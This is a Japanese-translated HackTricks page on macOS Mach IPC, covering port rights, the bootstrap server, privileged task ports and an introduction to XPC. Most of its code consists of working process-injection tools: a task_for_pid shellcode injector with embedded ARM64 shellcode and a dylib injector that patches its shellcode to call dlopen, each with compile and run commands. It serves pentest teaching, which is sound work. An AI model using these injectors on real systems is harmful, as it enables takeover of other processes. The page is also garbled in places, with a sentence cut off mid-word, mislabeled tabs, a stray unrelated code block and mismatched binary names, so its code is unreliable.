# macOS IPC - プロセス間通信

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

## ポートを介したMachメッセージング

Machは、リソースの共有において**タスク**を最小単位として使用し、各タスクは**複数のスレッド**を含むことができます。これらの**タスクとスレッドは、POSIXプロセスとスレッドに1：1でマッピング**されます。

タスク間の通信は、Machインタープロセス通信（IPC）を使用して行われ、片方向の通信チャネルを利用します。**メッセージはポート間で転送**され、カーネルによって管理される**メッセージキュー**のような役割を果たします。

タスクが実行できる操作を定義するポート権限は、この通信に重要です。可能な**ポート権限**は次のとおりです。

* **受信権限**：ポートに送信されたメッセージを受信することを許可します。MachポートはMPSC（複数プロデューサ、単一コンシューマ）キューであるため、システム全体で**ポートごとに受信権限は1つだけ**存在できます（複数のプロセスが1つのパイプの読み取りエンドに対するファイルディスクリプタを保持できるパイプとは異なります）。
* **受信権限を持つタスク**は、メッセージを受信し、メッセージを送信するための**送信権限を作成**することができます。元々は**自分自身のタスクがポートに対して受信権限を持っていました**。
* **送信権限**：ポートにメッセージを送信することを許可します。
* **一度だけ送信権限**：ポートに1つのメッセージを送信し、その後消えます。
* **ポートセット権限**：単一のポートではなく、_ポートセット_を示します。ポートセットからメッセージをデキューすると、そのポートセットに含まれるポートからメッセージがデキューされます。ポートセットは、Unixの`select`/`poll`/`epoll`/`kqueue`のように、複数のポートで同時にリッスンするために使用できます。
* **デッドネーム**：実際のポート権限ではなく、単なるプレースホルダーです。ポートが破棄されると、ポートへのすべての既存のポート権限はデッドネームに変わります。

**タスクはSEND権限を他のタスクに転送**することができ、それによりメッセージを送り返すことができます。**SEND権限は複製することもできるため、タスクはSEND権限を第三のタスクに複製して与える**ことができます。これにより、中間プロセスである**ブートストラップサーバー**との効果的な通信が可能になります。

#### 手順：

上記に述べたように、通信チャネルを確立するためには、**ブートストラップサーバー**（macでは**launchd**）が関与します。

1. タスク**A**は**新しいポート**を初期化し、プロセス内で**受信権限**を取得します。
2. 受信権限を持つタスク**A**は、ポートのために**SEND権限を生成**します。
3. タスク**A**は、**ブートストラップサーバー**との**接続**を確立し、**ポートのサービス名**と**SEND権限**をブートストラップ登録という手順を通じて提供します。
4. タスク**B**は、サービス名のために**ブートストラップサーバー**とやり取りし、ブートストラップの**サービス名の検索**を実行します。成功した場合、**サーバーはタスクAから受け取ったSEND権限を複製**し、**タスクBに送信**します。
5. SEND権限を取得したタスク**B**は、メッセージを**作成**し、それを**タスクAに送信**することができます。

ブートストラップサーバーは、タスクが主張するサービス名を認証することはできません。これは、タスクが潜在的に**システムタスクをなりすます**ことができる可能性があることを意味します。たとえば、認証サービス名を偽って主張し、すべてのリクエストを承認することができます。

その後、Appleはシステム提供のサービスの名前を、**SIPで保護された**ディレクトリにある安全な設定ファイルに保存します：`/System/Library/LaunchDaemons`および`/System/Library/LaunchAgents`。ブートストラップサーバーは、これらのサービス名ごとに**受信権限を作成**し、保持します。

これらの事前定義されたサービスに対しては、**検索プロセスが若干異なります**。サービス名が検索されると、launchdはサービスを動的に起動します。新しいワークフローは次のようになります。

* タスク**B**は、サービス名のためにブートストラップの**検索**を開始します。
* **launchd**は、タスクが実行中かどうかをチェックし、実行されていない場合は**起動**します。
* タスク**A**（サービス）は、**ブートストラップチェックイン**を実行します。ここでは、**ブートストラップ**サーバーがSEND権限を作成し、保持し、**受信権限をタスクAに転送**します。
* launchdは**SEND権限を複製し、タスクBに送信**します。

ただし、このプロセスは事前定義されたシステムタスクにのみ適用され
### コード例

**送信者**がポートを**割り当て**し、名前 `org.darlinghq.example` のために**送信権**を作成し、それを**ブートストラップサーバー**に送信する方法に注目してください。送信者はその名前の**送信権**を要求し、それを使用して**メッセージを送信**します。

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <mach/mach.h>
#include <mach/message.h>

#define BUFFER_SIZE 1024

int main(int argc, char** argv) {
    mach_port_t server_port;
    kern_return_t kr;
    char buffer[BUFFER_SIZE];

    // Connect to the server port
    kr = task_get_special_port(mach_task_self(), TASK_AUDIT_PORT, &server_port);
    if (kr != KERN_SUCCESS) {
        printf("Failed to get server port: %s\n", mach_error_string(kr));
        return 1;
    }

    // Send a message to the server
    mach_msg_header_t* msg = (mach_msg_header_t*)buffer;
    msg->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
    msg->msgh_size = sizeof(buffer);
    msg->msgh_remote_port = server_port;
    msg->msgh_local_port = MACH_PORT_NULL;
    msg->msgh_reserved = 0;
    msg->msgh_id = 0;

    kr = mach_msg(msg, MACH_SEND_MSG, msg->msgh_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if (kr != KERN_SUCCESS) {
        printf("Failed to send message: %s\n", mach_error_string(kr));
        return 1;
    }

    // Receive a response from the server
    kr = mach_msg(msg, MACH_RCV_MSG, 0, msg->msgh_size, server_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if (kr != KERN_SUCCESS) {
        printf("Failed to receive message: %s\n", mach_error_string(kr));
        return 1;
    }

    // Print the response
    printf("Received message: %s\n", buffer);

    return 0;
}
```
{% endtab %}

{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{% endtab %}
{% endtabs %}

### 特権ポート

* **ホストポート**: プロセスがこのポートに対して**送信権限**を持っている場合、システムに関する**情報**（例：`host_processor_info`）を取得できます。
* **ホスト特権ポート**: このポートに対して**送信権限**を持つプロセスは、カーネル拡張をロードするなどの**特権アクション**を実行できます。この権限を取得するには、**プロセスはルート権限**を持つ必要があります。
* さらに、**`kext_request`** APIを呼び出すためには、Appleのバイナリにのみ与えられる**`com.apple.private.kext`**というエンタイトルメントが必要です。
* **タスク名ポート**: _タスクポート_の非特権バージョンです。タスクを参照することはできますが、制御することはできません。これを通じて利用できる唯一のものは`task_info()`のようです。
* **タスクポート**（またはカーネルポート）**:** このポートに対して送信権限を持つと、タスクを制御することができます（メモリの読み書き、スレッドの作成など）。
* 呼び出し元タスクのためのこのポートの**名前を取得**するには、`mach_task_self()`を呼び出します。このポートは**`exec()`を跨いでのみ継承**されます。`fork()`で作成された新しいタスクは新しいタスクポートを取得します（特別なケースとして、suidバイナリを`exec()`するとタスクも新しいタスクポートを取得します）。タスクを生成し、そのポートを取得する唯一の方法は、`fork()`を行う際に["ポートスワップダンス"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html)を実行することです。
* これらはポートへのアクセス制限です（バイナリ`AppleMobileFileIntegrity`の`macos_task_policy`から）：
* アプリに**`com.apple.security.get-task-allow`エンタイトルメント**がある場合、**同じユーザーのプロセスはタスクポートにアクセス**できます（デバッグのためにXcodeによって一般的に追加されます）。**ノータリゼーション**プロセスは本番リリースでは許可しません。
* **`com.apple.system-task-ports`**エンタイトルメントを持つアプリは、カーネルを除く**任意の**プロセスの**タスクポート**を取得できます。以前のバージョンでは**`task_for_pid-allow`**と呼ばれていました。これはAppleのアプリケーションにのみ付与されます。
* **ルートユーザーは、ハード化されたランタイムでコンパイルされていないアプリケーション**（およびAppleのアプリケーションではない）のタスクポートにアクセスできます。

### タスクポートを介したシェルコードのプロセスインジェクション

シェルコードは次から取得できます：

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

{% tabs %}
{% tab title="mysleep.m" %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep
#import <Foundation/Foundation.h>

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo] processIdentifier]);
[NSThread sleepForTimeInterval:99999];
}
return 0;
}
```
{% tab title="entitlements.plist" %}エンタイトルメント.plist
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{% tabs %}
{% tab title="English" %}
```objective-c
#import <Foundation/Foundation.h>
#import <mach/mach.h>
#import <mach/mach_vm.h>

int main(int argc, const char * argv[]) {
    @autoreleasepool {
        if (argc != 2) {
            printf("Usage: %s <pid>\n", argv[0]);
            return 0;
        }
        
        pid_t target_pid = atoi(argv[1]);
        mach_port_t target_task;
        kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &target_task);
        if (kr != KERN_SUCCESS) {
            printf("Failed to get task for pid %d: %s\n", target_pid, mach_error_string(kr));
            return 0;
        }
        
        const char *payload = "PAYLOAD";
        mach_vm_address_t remote_address;
        mach_vm_size_t payload_size = strlen(payload) + 1;
        kr = mach_vm_allocate(target_task, &remote_address, payload_size, VM_FLAGS_ANYWHERE);
        if (kr != KERN_SUCCESS) {
            printf("Failed to allocate memory in target task: %s\n", mach_error_string(kr));
            return 0;
        }
        
        kr = mach_vm_write(target_task, remote_address, (vm_offset_t)payload, payload_size);
        if (kr != KERN_SUCCESS) {
            printf("Failed to write payload to target task: %s\n", mach_error_string(kr));
            return 0;
        }
        
        mach_vm_address_t remote_entrypoint = remote_address;
        kr = thread_create_running(target_task, &remote_entrypoint);
        if (kr != KERN_SUCCESS) {
            printf("Failed to create remote thread: %s\n", mach_error_string(kr));
            return 0;
        }
        
        printf("Code injected successfully\n");
    }
    return 0;
}
```
{% endtab %}
{% endtabs %}
</details>

Compile the previous program and add the entitlements to be able to inject code with the same user (if not you will need to use sudo).

<details>

<summary>injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid>", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pid-of-mysleep>
```
### タスクポートを介したDylibプロセスインジェクション

macOSでは、**スレッド**は**Mach**を使用するか、**posixの`pthread` API**を使用して操作することができます。前のインジェクションで生成したスレッドは、Mach APIを使用して生成されたため、**posixに準拠していません**。

単純なシェルコードをインジェクションしてコマンドを実行することができたのは、**posixに準拠する必要がなく**、Machのみで動作する必要があったためです。**より複雑なインジェクション**では、スレッドも**posixに準拠する必要があります**。

したがって、シェルコードを**改善するために**、**`pthread_create_from_mach_thread`**を呼び出す必要があります。これにより、新しいpthreadが**有効なpthreadを作成**できます。その後、この新しいpthreadは、システムから**dylibをロード**するために**dlopen**を呼び出すことができます。

例えば、（ログを生成し、それを聞くことができるものなど）**例のdylib**は以下で見つけることができます：

{% content-ref url="../../macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../../macos-dyld-hijacking-and-dyld\_insert\_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

"\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}
```c
if (memcmp(possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
    memcpy(possiblePatchLocation, &addrOfPthreadCreate, 8);
    printf("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
    printf("DLOpen @%llx\n", addrOfDlopen);
    memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
    strcpy(possiblePatchLocation, lib);
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // タスクポート
remoteCode64,                 // 仮想アドレス（宛先）
(vm_address_t) injectedCode,  // ソース
0xa9);                       // ソースの長さ


if (kr != KERN_SUCCESS)
{
fprintf(stderr, "リモートスレッドメモリの書き込みに失敗しました：エラー %s\n", mach_error_string(kr));
return (-3);
}


// 割り当てられたコードメモリのアクセス許可を設定する
kr = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr, "リモートスレッドのコードのメモリアクセス許可を設定できません：エラー %s\n", mach_error_string(kr));
return (-4);
}

// 割り当てられたスタックメモリのアクセス許可を設定する
kr = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr, "リモートスレッドのスタックのメモリアクセス許可を設定できません：エラー %s\n", mach_error_string(kr));
return (-4);
}


// シェルコードを実行するためのスレッドを作成する
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64));

remoteStack64 += (STACK_SIZE / 2); // これが実際のスタックです
//remoteStack64 -= 8;  // 16のアライメントが必要です

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf("リモートスタック64  0x%llx、リモートコードは %p\n", remoteStack64, p);

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT, &remoteThread);

if (kr != KERN_SUCCESS) {
fprintf(stderr, "リモートスレッドの作成に失敗しました：エラー %s", mach_error_string(kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf(stderr, "使用法：%s _pid_ _action_\n", argv[0]);
fprintf(stderr, "   _action_：ディスク上のdylibへのパス\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat(action, &buf);
if (rc == 0) inject(pid, action);
else
{
fprintf(stderr, "Dylibが見つかりません\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### タスクポートを介したスレッドインジェクション <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

## XPC

### 基本情報

XPC（XNUはmacOSで使用されるカーネルの略）インタープロセス通信は、macOSとiOS上のプロセス間の通信のためのフレームワークです。XPCは、システム上の異なるプロセス間で安全な非同期メソッド呼び出しを行うためのメカニズムを提供します。これはAppleのセキュリティパラダイムの一部であり、特権を分離したアプリケーションの作成を可能にし、各コンポーネントが必要な権限のみで動作するため、侵害されたプロセスからの潜在的な被害を制限します。

XPCは、同じシステム上で実行される異なるプログラム間でデータを送受信するための一連のメソッドである、プロセス間通信（IPC）の形式を使用します。

XPCの主な利点は次のとおりです：

1. **セキュリティ**：作業を異なるプロセスに分割することで、各プロセスに必要な権限のみを付与することができます。これにより、プロセスが侵害された場合でも、被害を最小限に抑えることができます。
2. **安定性**：XPCはクラッシュを発生したコンポーネントに限定することで、システム全体に影響を与えずにプロセスを再起動するのに役立ちます。
3. **パフォーマンス**：XPCは簡単な並行性を可能にし、異なるプロセスで同時にさまざまなタスクを実行できます。

